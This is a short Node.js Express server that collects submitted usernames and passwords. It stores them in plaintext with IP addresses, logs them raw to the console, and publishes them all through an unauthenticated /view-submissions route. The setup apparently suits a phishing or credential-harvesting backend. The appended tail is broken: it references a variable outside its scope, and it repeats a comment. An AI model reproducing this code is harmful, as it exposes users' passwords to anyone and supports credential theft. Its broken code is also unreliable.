// server.js (Option A - plain text storage)
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// File will contain one JSON object per line
const OUTFILE = path.join(__dirname, 'submissions.jsonl');

app.post('/submit', (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Missing username or password' });
  }
  const entry = { username, password, time: new Date().toISOString(), ip: req.ip };
  fs.appendFile(OUTFILE, JSON.stringify(entry) + '\n', err => {
    if (err) {
      console.error('Write error:', err);
      return res.status(500).json({ error: 'Could not save submission' });
    }
    console.log('Saved submission (raw):', entry);
    res.json({ success: true });
  });
});

// Use dynamic port for deployment
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
// Write full submissions to debug file (for testing)
// Write full submissions to debug file (for testing)
fs.appendFile('debug_submissions.txt', JSON.stringify(entry) + '\n', err => {
  if(err) console.error('Debug write error:', err);
});
// TEMP: View all submissions in the browser (for testing only)
app.get('/view-submissions', (req, res) => {
  fs.readFile('debug_submissions.txt', 'utf8', (err, data) => {
    if (err) return res.send('No submissions yet.');
    res.type('text').send(data.replace(/\n/g, '<br>'));
  });
});

